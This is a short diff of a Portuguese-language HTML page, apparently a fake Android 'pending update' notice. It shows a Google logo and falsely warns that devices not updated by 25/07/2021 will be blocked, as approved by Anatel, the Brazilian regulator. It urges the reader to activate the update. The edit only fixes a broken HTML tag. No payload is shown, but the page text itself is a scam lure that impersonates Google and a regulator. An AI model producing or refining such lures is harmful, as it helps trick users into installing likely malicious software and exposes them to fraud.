@@ -40,7 +40,7 @@
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
        
-        <small><p class="lead">Atualização Pendente.</p><br><p>  Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">25/07/2021</b><br> estarão passivos de bloqueio sem aviso prévio conforme homologado pela <b style="color:red">Anatel</b<br> Ative a atualização pendente e evite futuros bloqueios no seu dispositivo. </p>
+        <small><p class="lead">Atualização Pendente.</p><br><p>  Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">25/07/2021</b><br> estarão passivos de bloqueio sem aviso prévio conforme homologado pela <b style="color:red">Anatel</b><br> Ative a atualização pendente e evite futuros bloqueios no seu dispositivo. </p>
 		
 		<p><b>Tempo de conclusão estimado: 1-2 minutos</b></p>
 		<p><b style="color:blue">Versão: 48.2.4</b></p>
